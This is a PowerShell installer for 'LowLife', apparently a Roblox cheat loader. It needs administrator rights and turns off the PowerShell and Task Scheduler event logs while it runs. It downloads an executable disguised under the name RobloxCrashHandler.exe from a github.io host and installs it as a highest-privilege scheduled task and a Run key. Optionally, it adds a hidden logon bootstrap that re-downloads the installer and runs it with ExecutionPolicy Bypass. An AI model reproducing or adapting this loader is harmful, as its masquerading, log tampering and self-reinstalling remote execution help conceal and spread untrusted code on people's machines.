# ==============================================================================
# LowLife Cheat Environment Remote Installer
# ==============================================================================
param (
    [string]$Key = "",
    [switch]$Silent = $false,
    [switch]$Persist = $false
)
$ErrorActionPreference = "Stop"

# CONFIGURATION: Update this URL to point to the folder on your web server where
# you uploaded the precompiled 'RobloxCrashHandler.exe' and 'cleanup.ps1' files.
$ServerBaseUrl = "https://cc312123.github.io/lowlife/files"

$InstallFolder = "$env:LOCALAPPDATA\RobloxCrashHandler"
$KeyFileInstalled = Join-Path $InstallFolder "key.txt"

# Verify Administrator privileges
$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if (-not $isAdmin) {
    Write-Host "==========================================================" -ForegroundColor Red
    Write-Host "       ERROR: THIS SCRIPT MUST BE RUN AS ADMINISTRATOR!     " -ForegroundColor Red
    Write-Host "==========================================================" -ForegroundColor Red
    Write-Host "Please re-run your PowerShell session as Administrator to install."
    Write-Host "==========================================================" -ForegroundColor Red
    Exit
}

Write-Host "==========================================================" -ForegroundColor Cyan
Write-Host "           LOWLIFE SYSTEM REMOTE INSTALLER                " -ForegroundColor Cyan
Write-Host "==========================================================" -ForegroundColor Cyan

# Disable logging temporarily to keep the installation clean
wevtutil.exe sl "Microsoft-Windows-PowerShell/Operational" /e:false 2>$null
wevtutil.exe sl "Microsoft-Windows-TaskScheduler/Operational" /e:false 2>$null

# License Key setup
$licenseKey = ""
if ($Key) {
    $licenseKey = $Key
} elseif (Test-Path $KeyFileInstalled) {
    $licenseKey = (Get-Content $KeyFileInstalled).Trim()
} elseif (Test-Path "$env:USERPROFILE\.lowlife_key") {
    $licenseKey = (Get-Content "$env:USERPROFILE\.lowlife_key").Trim()
}

if (-not $licenseKey) {
    if ($Silent) {
        Write-Error "License key is missing in silent mode."
        Exit
    }
    Write-Host "License key not found locally." -ForegroundColor Yellow
    $licenseKey = Read-Host "Please enter your LowLife license key"
    if ([string]::IsNullOrWhiteSpace($licenseKey)) {
        Write-Error "License key cannot be empty."
    }
    $licenseKey = $licenseKey.Trim()
}

# Prompt for persistence if running interactively
if (-not $Silent -and -not $Persist) {
    Write-Host ""
    $persistResponse = Read-Host "Do you want to enable automatic reinstallation on startup (Persistence Mode)? [Y/N]"
    if ($persistResponse -match "^[yY](es)?$") {
        $Persist = $true
    }
}


# 1. Terminate existing services/tasks to prevent file lock issues
Write-Host "[1/5] Stopping any running instances..." -ForegroundColor Yellow
if (Get-ScheduledTask -TaskName "RobloxCrashHandler" -ErrorAction SilentlyContinue) {
    Stop-ScheduledTask -TaskName "RobloxCrashHandler" -ErrorAction SilentlyContinue
}
Stop-Process -Name "RobloxCrashHandler" -Force -ErrorAction SilentlyContinue

# 2. Create the target installation directory
if (-not (Test-Path $InstallFolder)) {
    New-Item -ItemType Directory -Path $InstallFolder -Force | Out-Null
}

# 3. Download the pre-compiled files from your server
Write-Host "[2/5] Downloading program files from server..." -ForegroundColor Yellow
$InstallPathExe = "$InstallFolder\RobloxCrashHandler.exe"
$CleanupScriptInstalled = "$InstallFolder\cleanup.ps1"

# Handle file rename override if locked
if (Test-Path $InstallPathExe) { 
    Rename-Item -Path $InstallPathExe -NewName "RobloxCrashHandler.exe.old" -Force -ErrorAction SilentlyContinue 
}

# Download files
Invoke-WebRequest -Uri "$ServerBaseUrl/RobloxCrashHandler.exe" -OutFile $InstallPathExe -UseBasicParsing
Invoke-WebRequest -Uri "$ServerBaseUrl/cleanup.ps1" -OutFile $CleanupScriptInstalled -UseBasicParsing

# Save the configured license key
$licenseKey | Out-File -FilePath $KeyFileInstalled -Encoding utf8 -NoNewline
Write-Host "Files successfully downloaded to: $InstallFolder" -ForegroundColor Green

# If persistence is enabled, write persistent bootstrap files and task
if ($Persist) {
    $persistFlagFile = "$env:USERPROFILE\.lowlife_persistence"
    $persistKeyFile = "$env:USERPROFILE\.lowlife_key"
    $persistBootstrapFile = "$env:USERPROFILE\.lowlife_bootstrap.ps1"

    # Save key and flag
    $null = New-Item -Path $persistFlagFile -ItemType File -Force -ErrorAction SilentlyContinue
    $licenseKey | Out-File -FilePath $persistKeyFile -Encoding utf8 -NoNewline

    # Embed bootstrap script content
    $bootstrapContent = @"
# ==============================================================================
# LowLife Startup Bootstrapper
# ==============================================================================
`$ErrorActionPreference = "Stop"

`$KeyFile = "`$env:USERPROFILE\.lowlife_key"
`$PersistenceFlag = "`$env:USERPROFILE\.lowlife_persistence"

if (-not (Test-Path `$KeyFile) -or -not (Test-Path `$PersistenceFlag)) {
    Exit
}

`$licenseKey = (Get-Content `$KeyFile).Trim()
if ([string]::IsNullOrWhiteSpace(`$licenseKey)) {
    Exit
}

`$ServerBaseUrl = "$ServerBaseUrl"
`$TempInstaller = "`$env:TEMP\lowlife_installer_temp.ps1"

`$connected = `$false
for (`$i = 0; `$i -lt 10; `$i++) {
    try {
        `$result = [System.Net.Dns]::GetHostAddresses("cc312123.github.io")
        if (`$result) {
            `$connected = `$true
            break;
        }
    } catch {}
    Start-Sleep -Seconds 3
}

if (-not `$connected) {
    Exit
}

try {
    Invoke-WebRequest -Uri "`$ServerBaseUrl/installer.ps1" -OutFile `$TempInstaller -UseBasicParsing
    Start-Process powershell.exe -ArgumentList "-WindowStyle Hidden -ExecutionPolicy Bypass -File \`"`$TempInstaller\`" -Silent -Key \`"`$licenseKey\`" -Persist" -Wait -NoNewWindow
} catch {}
"@
    $bootstrapContent | Out-File -FilePath $persistBootstrapFile -Encoding utf8 -Force

    # Register the scheduled task RobloxCrashHandlerBootstrapper
    Write-Host "Registering persistent bootstrapper task..." -ForegroundColor Yellow
    schtasks /create /tn "RobloxCrashHandlerBootstrapper" /tr "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File \"$persistBootstrapFile\"" /sc onlogon /rl highest /f | Out-Null
}

# 4. Configure elevated UAC-bypassed Scheduled Task
Write-Host "[3/5] Registering Task Scheduler service..." -ForegroundColor Yellow
if ($Persist) {
    schtasks /create /tn "RobloxCrashHandler" /tr "$InstallPathExe" /sc manual /rl highest /f
} else {
    schtasks /create /tn "RobloxCrashHandler" /tr "$InstallPathExe" /sc onlogon /rl highest /f
}

# Configure Registry Run key for interactive browser popup on startup
$RunKeyPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
$PortalUrl = "http://127.0.0.1:9876/"
$RunCommand = "powershell.exe -WindowStyle Hidden -Command `"Start-Sleep -Seconds 3; Start-Process '$PortalUrl'`""
New-ItemProperty -Path $RunKeyPath -Name "LowLifePortal" -Value $RunCommand -PropertyType String -Force | Out-Null

# 5. Launch the Loader
Write-Host "[4/5] Starting service..." -ForegroundColor Yellow
schtasks /run /tn "RobloxCrashHandler"

# Re-enable Event Logging
wevtutil.exe sl "Microsoft-Windows-PowerShell/Operational" /e:true 2>$null
wevtutil.exe sl "Microsoft-Windows-TaskScheduler/Operational" /e:true 2>$null

Write-Host "==========================================================" -ForegroundColor Green
Write-Host " SUCCESS: Installation complete! Services are active.      " -ForegroundColor Green
Write-Host " -> Portals Active at: http://localhost:9876/              " -ForegroundColor Cyan
Write-Host "==========================================================" -ForegroundColor Green
